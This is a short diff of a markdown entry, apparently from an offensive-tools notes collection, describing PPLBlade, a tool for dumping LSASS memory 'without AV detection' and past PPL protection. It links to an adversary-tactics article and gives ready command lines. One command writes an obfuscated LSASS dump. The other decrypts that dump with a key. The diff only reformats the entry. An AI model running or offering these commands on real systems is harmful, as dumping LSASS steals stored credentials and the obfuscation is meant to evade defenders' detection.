@@ -1,4 +1,6 @@
-# Dump LSASS without AV detection with PPLBlade
+# PPLBlade
+
+## Dump LSASS without AV detection with PPLBlade
 
 ## Link: https://tacticaladversary.io/adversary-tactics/bypass-defender-and-ppl-protection-to-dump-lsass/?s=08
 
@@ -6,8 +8,12 @@
 
 ### Example Usage:
 
-#### 1) PPLBlade.exe --mode dothatlsassthing --obfuscate (Dump obfuscated dump file)
+#### 1) Dump obfuscated dump file
 
-#### 2) PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade (Deobfuscate dump file)
+    PPLBlade.exe --mode dothatlsassthing --obfuscate 
+    
+#### 2) Deobfuscate dump file
+
+    PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade 
 
 ### For more details, consult the github repository for more.
